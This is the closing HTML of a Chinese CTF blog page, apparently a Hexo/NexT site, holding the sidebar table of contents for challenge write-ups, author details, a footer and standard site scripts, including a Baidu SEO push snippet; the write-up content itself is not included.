+      0CTF/TCTF 2020 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#简单的计算题1"><span class="nav-text">简单的计算题1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#简单的计算题2"><span class="nav-text">简单的计算题2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phpuns"><span class="nav-text">phpuns</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc"><span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#cryptographic-call"><span class="nav-text">cryptographic_call</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PhysicalHacker"><span class="nav-text">PhysicalHacker</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BaiduYun-amp-Gcode"><span class="nav-text">BaiduYun&amp;Gcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Keyboard"><span class="nav-text">Keyboard</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#透明度"><span class="nav-text">透明度</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Jeff"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Jeff</p>
+  <div class="site-description" itemprop="description">一个菜狗的辣鸡博客。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">31</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2plZmZ6NjE1" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;jeffz615"><i class="fab fa-github fa-fw"></i></span>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">版权由 <a href="https://github.com/jeffz615" target="_blank" rel="noopener"><b>Jeff</b></a> 所有,转载请标明出处</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var canonicalURL, curProtocol;
+      //Get the <link> tag
+      var x=document.getElementsByTagName("link");
+		//Find the last canonical URL
+		if(x.length > 0){
+			for (i=0;i<x.length;i++){
+				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
+					canonicalURL=x[i].href;
+				}
+			}
+		}
+    //Get protocol
+	    if (!canonicalURL){
+	    	curProtocol = window.location.protocol.split(':')[0];
+	    }
+	    else{
+	    	curProtocol = canonicalURL.split(':')[0];
+	    }
+      //Get current URL if the canonical URL does not exist
+	    if (!canonicalURL) canonicalURL = window.location.href;
+	    //Assign script content. Replace current URL with the canonical URL
+      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
+  </script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
